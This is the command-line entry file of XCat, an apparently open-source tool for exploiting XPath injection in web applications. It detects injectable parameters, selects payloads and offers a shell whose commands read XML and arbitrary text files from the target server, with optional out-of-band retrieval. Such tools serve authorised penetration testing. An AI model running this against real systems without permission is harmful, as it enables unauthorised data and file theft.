"""
XCat.

Usage:
    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--shell] [--fast]
         [--method=<method>] [--oob-ip=<ip> (--oob-port=<port>)]
    xcat detectip

"""
import os

import atexit
import docopt
import asyncio
import aiohttp
import operator
import ipgetter
import aioconsole

from xcat.algorithms import iterate_all, count
from xcat.requester import Requester
from xcat.payloads import detect_payload
from xcat.features import detect_features
from xcat import actions
from typing import Callable
from xcat.display import display_xml
import shlex

from xcat.xpath import E
from xcat.xpath.xpath_2 import doc
from xcat.xpath.xpath_3 import unparsed_text_lines


def run():
    arguments = docopt.docopt(__doc__)

    if arguments['detectip']:
        print('Finding external IP address...')
        ip = ipgetter.myip()

        if ip:
            print(f'External IP: {ip}')
        else:
            print('Could not find external IP!')
        return

    match_function = make_match_function(arguments)

    url = arguments['<url>']
    target_parameter = arguments['<target_parameter>']
    parameters = arguments['<parameters>']

    oob_ip = arguments["--oob-ip"]
    oop_port = arguments["--oob-port"]

    shell = arguments['--shell']
    fast = arguments['--fast']

    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_action(url, target_parameter,
                                         parameters, match_function,
                                         oob_ip, oop_port,
                                         shell, fast))


async def start_action(url, target_parameter, parameters, match_function, oob_ip, oob_port, shell, fast):
    async with aiohttp.ClientSession() as session:
        payload_requester = Requester(url, target_parameter, parameters, match_function, session)

        print("Detecting injection points...")
        payloads = await detect_payload(payload_requester)

        for payload in payloads:
            print(payload.name)
            print(f' - Example: {payload.example}')

        if not payloads:
            print("No payloads found! Perhaps the target is not injectable, or xcat just sucks")
            return
        elif len(payloads) > 1:
            print("Multiple payloads found! Please specify them via the command line. "
                  "In the future. When this is implemented.")
            return
        else:
            chosen_payload = payloads[0]

        requester = Requester(url, target_parameter, parameters, match_function, session,
                              injector=chosen_payload.payload_generator,
                              external_ip=oob_ip, external_port=oob_port,
                              fast=fast)

        print("Detecting Features...")
        features = await detect_features(requester)

        for feature, available in features:
            print(f' - {feature.name} - {available}')
            requester.features[feature.name] = available

        try:
            if shell:
                await run_shell(requester)
            else:
                await display_xml([await actions.get_nodes(requester)])
            print(f'Total Requests: {requester.request_count}')
        finally:
            await requester.stop_oob_server()


def make_match_function(arguments) -> Callable[[aiohttp.Response, str], bool]:
    true_code, true_code_invert = arguments['--true-code'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    true_string, true_string_invert = arguments['--true-string'] or '', False

    if true_code.startswith('!'):
        true_code_invert = True
        true_code = true_code[1:]

    match_operator = operator.ne if true_code_invert or true_string_invert else operator.eq

    def response_checker(response: aiohttp.Response, content: str) -> bool:
        if true_code:
            match = match_operator(response.status, true_code)
        else:
            match = match_operator(true_string in content, True)

        return match

    return response_checker


async def run_shell(requester: Requester):
    # This function is horrible and I feel bad :(

    try:
        import readline
    except ImportError:
        pass
    else:
        histfile = os.path.join(os.path.expanduser("~"), ".xcat_history")

        try:
            readline.read_history_file(histfile)
        except FileNotFoundError:
            pass

        atexit.register(readline.write_history_file, histfile)

    print("XCat shell. Enter a command or 'help' for help. Funnily enough.")
    while True:
        cmd = await aioconsole.ainput('>> ')
        command = shlex.split(cmd)

        if command[0] == "help":
            pass

        if command[0] == "fetch":
            if len(command) != 2:
                print("fetch 'xpath expression'")
            else:
                await display_xml([await actions.get_nodes(requester, E(command[1]))])

        if command[0] == "read_xml":
            if len(command) != 2:
                print("read_xml 'xml path'")
            else:
                await display_xml([await actions.get_nodes(requester, doc(command[1]))])

        if command[0] == "read_text":
            if len(command) != 2:
                print("read_text 'text path'")
            else:
                if requester.features['unparsed-text']:
                    expression = unparsed_text_lines(command[1])
                    length = await count(requester, expression)
                    print(f"Lines: {length}")
                    async for line in iterate_all(requester, expression[1:length + 1]):
                        print(line)
                elif requester.features['oob-entity-injection']:
                    pass

if __name__ == "__main__":
    run()
